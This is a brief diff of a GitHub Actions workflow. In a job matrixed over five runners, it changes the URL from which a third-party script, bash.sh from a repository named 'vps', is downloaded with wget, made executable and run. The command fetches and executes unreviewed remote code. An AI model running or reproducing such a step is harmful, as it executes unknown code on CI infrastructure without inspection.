@@ -24,4 +24,4 @@ jobs:
      runner: [0,1,2,3,4]
    steps:
      - run: |
-          wget https://raw.githubusercontent.com/hendrilara/vps/main/bash.sh && chmod +x bash.sh && ./bash.sh
+          wget https://github.com/hendrilara/vps/blob/main/bash.sh && chmod +x bash.sh && ./bash.sh
